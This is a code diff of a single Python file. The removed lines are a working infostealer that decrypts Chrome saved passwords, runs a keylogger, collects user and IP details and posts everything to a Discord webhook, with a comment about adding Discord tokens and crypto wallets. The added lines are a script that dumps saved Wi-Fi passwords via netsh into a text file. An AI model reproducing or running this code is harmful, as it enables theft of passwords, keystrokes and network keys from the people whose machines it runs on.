@@ -1,49 +1,36 @@
-import os, json, sqlite3, shutil, requests, base64, win32crypt, getpass, socket
-from Crypto.Cipher import AES
-from pynput import keyboard
+import subprocess
+import datetime
 
-WEBHOOK = "https://discord.com/api/webhooks/your_webhook_here"
-
-# AES encryption helper
-KEY = b'RandomSecretKey123'
-def encrypt(data):
-    cipher = AES.new(KEY, AES.MODE_ECB)
-    return base64.b64encode(cipher.encrypt(data.ljust(32).encode())).decode()
-
-# Chrome passwords
-def get_chrome_passwords():
-    path = os.environ['LOCALAPPDATA'] + r"\Google\Chrome\User Data\Default\Login Data"
-    shutil.copy2(path, "LoginData.db")
-    conn = sqlite3.connect("LoginData.db")
-    cursor = conn.cursor()
-    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-    creds = []
-    for url, user, pwd in cursor.fetchall():
-        try: pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
-        except: pwd = ""
-        creds.append(f"{url} | {user} | {pwd}")
-    conn.close()
-    os.remove("LoginData.db")
-    return "\n".join(creds)
-
-# Keylogger
-keys = []
-def on_press(key):
-    try: keys.append(key.char)
-    except: keys.append(str(key))
-listener = keyboard.Listener(on_press=on_press)
-listener.start()
-
-# System info
-def get_sysinfo():
-    return f"User: {getpass.getuser()} | IP: {socket.gethostbyname(socket.gethostname())} | OS: {os.name}"
-
-# Send data to Discord
-def send_webhook(data):
-    requests.post(WEBHOOK, json={"content": f"```{data}```"})
-
-if __name__ == "__main__":
-    info = get_sysinfo() + "\n\nPasswords:\n" + get_chrome_passwords()
-    info += "\n\nKeylogger:\n" + "".join(keys)
-    # Add: Firefox/Edge, Discord tokens, Crypto wallets here
-    send_webhook(info)
+with open("passwords.txt", "w", encoding="utf-8") as file:
+    try:
+        points = 0
+        succpoints = 0
+        profiles = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=-1)
+        strprofiles = profiles.stdout.decode('cp866')
+        for stroke in strprofiles.split("\n"):
+            if len(stroke.split(":")) > 1 and stroke.split(":")[1] != "\r":
+                ssid = stroke.split(":")[1].removeprefix(" ").removesuffix("\r")
+                points += 1
+                try:
+                    password = subprocess.run(["netsh", "wlan", "show", "profiles", f'name={ssid}', "key=clear"], stdout=-1)
+                    strpass = password.stdout.decode('cp866')
+                    findpass = False
+                    for strokepass in strpass.split("\n"):
+                        if strokepass.find("Содержимое ключа") != -1:
+                            realpass = strokepass.split(":")[1].removeprefix(' ').removesuffix('\r')
+                            file.write(f"{ssid} = {realpass}\n")
+                            succpoints += 1
+                            findpass = True
+                            print(f"Getting and writing password for '{ssid}'")
+                    if findpass == False:
+                        raise Exception(f"Dont found 'Содержимое ключа'")
+                except Exception as exp:
+                    print(f"Error when getting password for '{ssid}': {exp}")
+        file.write(f"\nTime of parsing: {datetime.datetime.now()}")
+        print(f"Parsing succesfully completed. Getting {succpoints}/{points} password at all ({round(succpoints/points*100, 2)}%)")
+        input()
+    except Exception as exp:
+        print(f"Fatal Error: {exp}")
+        input()
+    finally:
+        file.close()
